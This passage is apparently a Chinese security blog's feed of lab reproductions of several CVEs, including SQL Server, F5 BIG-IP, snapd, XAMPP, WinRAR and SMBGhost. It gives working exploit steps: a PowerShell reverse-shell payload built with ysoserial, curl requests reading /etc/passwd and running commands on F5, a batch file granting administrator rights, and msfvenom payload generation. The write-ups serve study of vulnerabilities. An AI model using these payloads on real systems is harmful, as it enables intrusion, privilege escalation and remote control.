keyword">function</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'GBK//TRANSLIT'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$chars</span> <span class="token operator">.=</span> <span class="token function">str_pad</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$chars</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在命令行运行：<code>php filename.php</code>。正常来说会在命令行中返回一串字符串，但我这里没有返回，没有学过php所以也没找到是什么原因。</p><p>访问<code>http://127.0.0.1:8000/admin.html?s=admin/api.Update/get/encode/1d1a383c38</code>，（最后的<code>1d1a383c38</code>即为上面应该返回的字符串）即可看到成功读取文件，内容已加密。</p><p><a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt?type=3">解密</a>后，即为文件中的内容。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/254365.html">https://www.freebuf.com/vuls/254365.html</a></li><li><a target="_blank" rel="noopener" href="https://www.wangjingxian.cn/qita/102.html#">https://www.wangjingxian.cn/qita/102.html#</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zmzwll1314/article/details/74091788">https://blog.csdn.net/zmzwll1314/article/details/74091788</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xuandao_ahfengren/article/details/109143962">https://blog.csdn.net/xuandao_ahfengren/article/details/109143962</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路径遍历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0618 SQL Server RCE漏洞复现</title>
      <link href="2020/11/12/cve-2020-0618-lou-dong-fu-xian/"/>
      <url>2020/11/12/cve-2020-0618-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>SQL Server 2012 for 32-bit Systems Service Pack 4 (QFE)</p><p>SQL Server 2012 for x64-based Systems Service Pack 4 (QFE)</p><p>SQL Server 2014 Service Pack 3 for 32-bit Systems (CU)</p><p>SQL Server 2014 Service Pack 3 for 32-bit Systems (GDR)</p><p>SQL Server 2014 Service Pack 3 for x64-based Systems (CU)</p><p>SQL Server 2014 Service Pack 3 for x64-based Systems (GDR)</p><p>SQL Server 2016 for x64-based Systems Service Pack 1</p><p>SQL Server 2016 for x64-based Systems Service Pack 2 (CU)</p><p>SQL Server 2016 for x64-based Systems Service Pack 2 (GDR)</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Windows Server 2016，SQL Server 2016 sp2</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-靶机环境配置"><a href="#1-靶机环境配置" class="headerlink" title="1. 靶机环境配置"></a>1. 靶机环境配置</h3><p>下载SQL Server 2016安装包（在MSDN下载，官网已不支持安装），在靶机安装。</p><p>打开安装中心后，选择“安装 –&gt; 全新SQL Server独立安装…”。在这里一直下一步，直到“功能选择”。</p><p>接着下一步，直到“数据库引擎配置”。</p><p>继续下一步，直到安装完成，关闭页面。找到刚刚安装的Reporting Services配置管理器，什么也不需要配置，直接连接。</p><p>访问<a target="_blank" rel="noopener" href="http://localhost/ReportS">http://localhost/ReportS</a>，创建分页报表，提示需要安装报表服务器，根据提示下载安装。</p><p>安装好后再次点击新建分页报表，会打开Report Builder，并自动连接本地服务器。点击“表或矩阵向导”，下一步，新建。这里我不知道具体该如何设置（之前没有使用过SQL Server），网上找到的所有博客基本都是抄袭同一篇的，而被抄袭的这一篇在这一步也跳过了，所以摸索了好久才成功…</p><p>我的配置是：</p><ol><li>在刚刚的Reporting Service配置管理器中点击左侧栏的“数据库”，更改数据库，将名称改为localhost，后面以windows方式登录。</li><li>新建表的配置如下：</li></ol><p>这样应该是可以正确到达下一步的。在后面，随便选择一个表格，点击下一步，把左侧的变量随便拉到右侧即可。</p><p>创建完成后，保存到本地，然后点击左上角的运行，浏览器访问<a target="_blank" rel="noopener" href="http://localhost/ReportServer/Pages/ReportViewer.aspx">http://localhost/ReportServer/Pages/ReportViewer.aspx</a>，可能需要输入密码，如果能看到这个界面，说明环境已经部署成功了。</p><h3 id="2-生成payload"><a href="#2-生成payload" class="headerlink" title="2. 生成payload"></a>2. 生成payload</h3><p>下载POC<a target="_blank" rel="noopener" href="https://github.com/incredibleindishell/ysoserial.net-complied">编译工具</a>，解压里面的压缩包，然后找到ysoserial.exe，在当前目录下打开powershell，依次输入以下命令：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$command</span> = <span class="token string">'$client = New-Object System.Net.Sockets.TCPClient("nc反弹的ip",监听的端口);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'</span><span class="token variable">$bytes</span> = <span class="token namespace">[System.Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token variable">$encodedCommand</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\ysoserial<span class="token punctuation">.</span>exe <span class="token operator">-</span>g TypeConfuseDelegate <span class="token operator">-</span>f LosFormatter <span class="token operator">-</span>c <span class="token string">"powershell.exe -encodedCommand <span class="token variable">$encodedCommand</span>"</span> <span class="token operator">-</span>o base64 <span class="token punctuation">|</span> clip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后，payload就会自动复制到剪切板，记得及时保存下来。</p><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3. 反弹shell"></a>3. 反弹shell</h3><p>安装<a target="_blank" rel="noopener" href="https://www.baidu.com/link?url=noENi9FaI4au10gJVkmSmMPcoA2SXPBnRifVSq_n8rSrZPdjZ8yDkN1y-ll34ffQr0VVhfO46Z3p_NWSSq0XHq&amp;wd=&amp;eqid=c41167ea0001a921000000025fab8d68">netcat</a>，监听4444端口。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvvp <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开postman，发送方式为POST，在body中输入以下<strong>三</strong>个键值对（我刚开始没看见第三个，一直没有成功，浪费了很多时间）：</p><ul><li>NavigationCorrector$PageState = NeedsCorrection</li><li>NavigationCorrector$ViewState= 生成的payload</li><li>__VIEWSTATE = </li></ul><p>然后在Authorization中输入靶机用户名和密码。输入完成后，发送。如果成功的话，就可以看到nc已经收到了反弹shell，成功连接上靶机（也是本机）。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-5902 F5-BIGIP漏洞复现</title>
      <link href="2020/10/30/cve-2020-5902-lou-dong-fu-xian/"/>
      <url>2020/10/30/cve-2020-5902-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。</p><p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux</p><p>靶机：BIGIP 15.0.0-0.0.39.ALL-vmware（官网我试了好几个按照NVD的信息本应存在漏洞的版本，但只有这个能扫描到漏洞）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-BIGIP环境配置"><a href="#1-BIGIP环境配置" class="headerlink" title="1. BIGIP环境配置"></a>1. BIGIP环境配置</h3><p>在<a target="_blank" rel="noopener" href="https://www.f5.com.cn/trials/big-ip-virtual-edition">登陆页面</a>注册账号。</p><p>打开<a target="_blank" rel="noopener" href="https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&amp;pro=big-ip_v15.x&amp;ver=15.1.0&amp;container=Virtual-Edition">下载页面</a>，选择合适版本的ova文件下载，下载完成后，打开vmware，点击打开虚拟机，选择刚才下载的ova文件，将虚拟机导入。导入成功后，打开虚拟机设置，将第一个网络适配器改成NAT模式。然后开启虚拟机，默认账户名为root，密码为default，首次登录后需要更换密码。</p><p>输入config配置网卡信息，IP地址默认为<code>192.168.1.245</code>，需要自己按照NAT模式配置一下。配置完成后，只要能够ping通192.168.227.1（具体要看本机NAT模式配置）即可。</p><p>在浏览器中访问<code>https://192.168.227.156</code>，可以访问，输入用户名admin和密码（刚才自己设置的）就可以正常登录了。当这里环境配置成功。</p><h3 id="2-扫描漏洞"><a href="#2-扫描漏洞" class="headerlink" title="2. 扫描漏洞"></a>2. 扫描漏洞</h3><p>下载nmap的<a target="_blank" rel="noopener" href="https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve2020-5902.nse">漏洞扫描脚本</a>，然后进行扫描，得到以下结果，说明漏洞存在。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nmap <span class="token operator">--</span>script=脚本名称 <span class="token operator">-</span>p 443 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>227<span class="token punctuation">.</span>156<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-msf获取shell"><a href="#3-msf获取shell" class="headerlink" title="3. msf获取shell"></a>3. msf获取shell</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfconsolesearch cve<span class="token operator">-</span>2020<span class="token operator">-</span>5902use 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设置好相关的options后，输入exploit进行攻击，获取shell。</p><h3 id="4-目录遍历"><a href="#4-目录遍历" class="headerlink" title="4. 目录遍历"></a>4. 目录遍历</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">curl <span class="token operator">-</span>v <span class="token operator">-</span>k  <span class="token string">'https://F5 IP地址/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为内容太多了，显示不全。</p><h3 id="5-文件读取"><a href="#5-文件读取" class="headerlink" title="5. 文件读取"></a>5. 文件读取</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">curl <span class="token operator">-</span>v <span class="token operator">-</span>k  <span class="token string">'https://F5 ip地址/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-文件上传"><a href="#6-文件上传" class="headerlink" title="6. 文件上传"></a>6. 文件上传</h3><p>使用Burp Suite.</p><p>Request内容如下（Cookie需要自己设置）：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: JSESSIONID=9664B664C2FE55DF0F1019789C496E09;X-Forwarded-For: 8.8.8.8Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 41fileName=/tmp/1.txt&amp;content=CVE-2020-5902<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在BIGIP虚拟机查看：</p><h3 id="7-命令执行"><a href="#7-命令执行" class="headerlink" title="7. 命令执行"></a>7. 命令执行</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">curl <span class="token operator">-</span>v <span class="token operator">-</span>k  <span class="token string">'https://F5 IP地址/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-7304 Ubuntu本地提权漏洞复现</title>
      <link href="2020/10/27/cve-2019-7304-quan-xian-sheng-ji-lou-dong-fu-xian/"/>
      <url>2020/10/27/cve-2019-7304-quan-xian-sheng-ji-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>Snapd提供附加到本地UNIX_AF套接字的REST API。通过查询与该套接字的任何连接相关联的UID来完成对受限API函数的访问控制。在for循环中进行字符串解析期间，可能会影响用户控制的套接字对等数据以覆盖UID变量。这允许任何用户访问任何API函数。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Ubuntu 18.10</li><li>Ubuntu 18.04 LTS</li><li>Ubuntu 16.04 LTS</li><li>Ubuntu 14.04 LTS</li></ul><p><strong>snap version &lt; 2.37.1</strong></p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 16.04.07 LTS</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="1-确定snap版本"><a href="#1-确定snap版本" class="headerlink" title="1. 确定snap版本"></a>1. 确定snap版本</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">snap version<span class="token comment"># snap版本应该小于2.37.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Ubuntu自带的snap一般都不存在该漏洞，我在这里卡了很久，最后发现在<a target="_blank" rel="noopener" href="https://github.com/initstring/dirty_sock">POC</a>的README.md文档中给出了可用的下载链接。</p><h3 id="2-下载POC"><a href="#2-下载POC" class="headerlink" title="2. 下载POC"></a>2. 下载POC</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">git clone https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>initstring<span class="token operator">/</span>dirty_sock<span class="token punctuation">.</span>git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-生成密钥"><a href="#3-生成密钥" class="headerlink" title="3. 生成密钥"></a>3. 生成密钥</h3><p>登录<a target="_blank" rel="noopener" href="https://login.ubuntu.com/">Ubuntu</a>，创建账号，然后本地生成一个密钥。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa <span class="token operator">-</span>C <span class="token string">"Ubuntu注册邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入.ssh目录下，使用cat命令显示id_rsa.pub（公钥）内容，然后把这些内容拷到账户的ssh_key中。</p><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><p>首先开启ssh：<code>sudo /etc/init.d/ssh start</code>。如果提示找不到命令，则是ssh还没有安装，输入<code>sudo apt install openssh-server -y</code>以进行安装。安装完成后，再次启动。</p><p>进入poc文件夹，使用python3利用dirty_sockv1.py进行攻击，中间需要输入密码进行登录。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">sudo python3 dirty_sockv1<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"Ubuntu注册邮箱"</span> <span class="token operator">-</span>k <span class="token string">"/home/zxy/.ssh/id_rsa.pub"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行完后，查看/home路径下，多了一个和刚才创建ubuntu账户用户名相同的文件夹。但是我没找到该用户的密码是什么。</p><p>然后继续使用dirty_sockv2.py进行攻击：<code>sudo python3 dirty_sockv2.py</code>。</p><p>攻击成功，创建了一个用户名和密码均为dirty_sock的用户，我们可以验证该用户具有sudo权限。</p><p>利用完该脚本后，snap会自动升级，但是拥有sudo权限的dirty_sock用户却会一直存在并可用。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-11107漏洞复现</title>
      <link href="2020/10/13/cve-2020-11107-lou-dong-fu-xian/"/>
      <url>2020/10/13/cve-2020-11107-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>XAMPP是一个把Apache网页服务器与PHP、Perl及MariaDB集合在一起的安裝包，允许用戶可以在自己的电脑上轻易的建立网页服务器。该软件与phpstudy类似。在windows下，XAMPP允许非管理员账号访问和修改其编辑器和浏览器的配置，编辑器的默认配置为notepad.exe，一旦修改配置后，则对应的每个可以访问XAMPP控制面板的用户都更改了配置。当攻击者将编辑器的值设置为恶意的.exe文件或.bat文件，与此同时如果有管理员账号通过XAMPP控制面板查看apache的日志文件，便会执行恶意的.exe文件或.bat文件，以此达到任意命令执行。</p><blockquote><p>这是我在实验室学习渗透测试所做的第二十一个漏洞复现，较简单。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Apache Friends XAMPP &lt;7.2.29</li><li>Apache Friends XAMPP 7.3.*，&lt;7.3.16</li><li>Apache Friends XAMPP 7.4.*，&lt;7.4.4</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>windows 10（XAMPP 7.4.1）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-以管理员权限安装XAMPP"><a href="#1-以管理员权限安装XAMPP" class="headerlink" title="1. 以管理员权限安装XAMPP"></a>1. 以管理员权限安装<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/xampp/files/">XAMPP</a></h3><p>老版本有很多无法正常下载，7.4.1可以下载，下载后在windows10虚拟机上安装，注意提前新建一个盘，XAMPP不能安装在C盘。</p><p>安装选项均默认。</p><p>当前用户为zxy。</p><h3 id="2-创建普通权限用户"><a href="#2-创建普通权限用户" class="headerlink" title="2. 创建普通权限用户"></a>2. 创建普通权限用户</h3><p>以管理员权限启动cmd（<code>powershell start-process cmd -verb runas</code>），通过<code>net user lowuser /add</code>创建一个普通用户lowuser。</p><p>输入<code>net user lowuser *</code>为lowuser用户设置密码。完成后，注销拥有管理员权限的zxy用户，以普通用户lowuser登录。</p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h3><p>打开文件资源管理器，设置为可以查看隐藏文件。然后新建一个<code>command.bat</code>文件，其作用是将lowuser用户加入管理员组。在文件中写入如下内容：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">@<span class="token function">echo</span> offnet localgroup administrators lowuser <span class="token operator">/</span>add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行XAMPP，在控制面板右上角找到config，修改编辑器的默认配置，更改为刚才创建的command.bat文件，添加并应用。</p><p>此时，lowuser还是普通权限用户。注销lowuser，再次以管理员（zxy）登录，右键以<strong>管理员权限</strong>打开XAMPP控制面板（原博客没有说以管理员权限打开），启动可以启动的Module，然后找到Logs，随意点开几个，可以看到有一个命令行界面一闪而过。</p><p>然后在命令行下查询lowuser的权限，发现已经变为了管理员。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250漏洞复现</title>
      <link href="2020/10/13/cve-2018-20250-lou-dong-fu-xian/"/>
      <url>2020/10/13/cve-2018-20250-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><blockquote><p>这是我在实验室学习渗透测试所做的第二十个漏洞复现，过程很简单。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>WinRar &lt; 5.70 Beta 1</li><li>Bandzip &lt;= 6.2.0.0</li><li>好压（2345压缩）&lt; 5.9.8.10907</li><li>360压缩 &lt; 4.0.0.1170</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-下载POC并执行"><a href="#1-下载POC并执行" class="headerlink" title="1. 下载POC并执行"></a>1. 下载<a target="_blank" rel="noopener" href="https://github.com/backlion/CVE-2018-20250">POC</a>并执行</h3><p>下载完成后，使用python3.7或以上版本执行exp.py：<code>python exp.py</code>，会自动生成需要的<code>test.rar</code>压缩包。</p><h3 id="2-在靶机解压文件"><a href="#2-在靶机解压文件" class="headerlink" title="2. 在靶机解压文件"></a>2. 在靶机解压文件</h3><p>注意exp.py中<code>target_filename</code>的值（<code>target_filename = r"C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe"</code>），可以注意到文件需要放在<code>C://Users/当前用户/任意一个文件夹</code>下。在这里我直接放在了桌面。然后解压文件，查看启动，可以看到多了一个<code>hi.exe</code>（即poc默认的木马文件，它会在开机时自动打开计算器程序）。</p><p>重启靶机，在开机时就可以看到计算器自动被执行。我用的是Windows7 64位旗舰版，在开机的时候未看到计算器成功被打开，手动尝试打开时提示我该程序与当前的系统不兼容。因此我复制了当前操作系统下的calc.exe到poc下进行了替换并重新复现，成功了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路径遍历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-0051 WebDAV漏洞复现</title>
      <link href="2020/10/10/cve-2016-0051-lou-dong-fu-xian/"/>
      <url>2020/10/10/cve-2016-0051-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>该漏洞存在于Microsoft Web 分布式创作和版本管理 (WebDAV)中，如果 Microsoft Web 分布式创作和版本管理 (WebDAV) 客户端验证输入不当，那么其中就会存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>windows 7 企业版 x86</p><p>Windows 10 x64 1511家庭版</p><h2 id="Windos7端复现过程"><a href="#Windos7端复现过程" class="headerlink" title="Windos7端复现过程"></a>Windos7端复现过程</h2><p>以非管理员身份登录，可以看到此时没有管理员权限。</p><p>下载<a target="_blank" rel="noopener" href="https://github.com/koczkatamas/CVE-2016-0051">poc</a>，解压其中的Eop.zip，打开<code>EoP.exe</code>,弹出命令行界面,等待一会儿,就会弹出提权后的命令行界面。</p><h2 id="Windows10端复现过程"><a href="#Windows10端复现过程" class="headerlink" title="Windows10端复现过程"></a>Windows10端复现过程</h2><p>安装Windows10 64位 1511家庭版，关闭windows defender，下载<a target="_blank" rel="noopener" href="https://github.com/koczkatamas/CVE-2016-0051">poc</a>，打开<code>BSoD.exe</code>，弹出命令行，等待一会儿，则会蓝屏。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796永恒之黑漏洞复现</title>
      <link href="2020/10/08/cve-2020-0796-yong-heng-zhi-hei-lou-dong-fu-xian/"/>
      <url>2020/10/08/cve-2020-0796-yong-heng-zhi-hei-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>Microsoft服务器消息块（SMB）协议是Microsoft Windows中使用的一项Microsoft网络文件共享协议。在大部分windows系统中都是默认开启的，用于在计算机间共享文件、打印机等。Windows 10和Windows Server 2016引入了SMB 3.1.1 。本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。利用该漏洞，黑客可直接远程攻击SMB服务端远程执行任意恶意代码，亦可通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十八个漏洞复现。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Windows 10 Version 1903 for 32-bit Systems</li><li>Windows 10 Version 1903 for x64-based Systems</li><li>Windows 10 Version 1903 for ARM64-based Systems</li><li>Windows Server, Version 1903 (Server Core installation)</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows Server, Version 1909 (Server Core installation)</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux 192.168.227.128</p><p>靶机：Windows 10 x64 1903 192.168.227.147</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>确保windows虚拟机在影响范围内。</p><p>在攻击机上安装python3.6或者以上的版本，下载漏洞检测工具<a target="_blank" rel="noopener" href="https://github.com/ollypwn/SMBGhost">SMBGhost</a>，确保漏洞存在。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">git clone https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>ollypwn<span class="token operator">/</span>SMBGhost<span class="token punctuation">.</span>gitcd SMBGhostpython3 scanner<span class="token punctuation">.</span>py 靶机IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-使用msf生成木马"><a href="#2-使用msf生成木马" class="headerlink" title="2. 使用msf生成木马"></a>2. 使用msf生成木马</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp LPORT=4444 <span class="token operator">-</span>b <span class="token string">'\x00'</span> <span class="token operator">-</span>i 1 <span class="token operator">-</span>f python&gt;exploit<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成的exploit.py即为木马文件。</p><h3 id="3-安装POC，配置exploit-py"><a href="#3-安装POC，配置exploit-py" class="headerlink" title="3. 安装POC，配置exploit.py"></a>3. 安装<a target="_blank" rel="noopener" 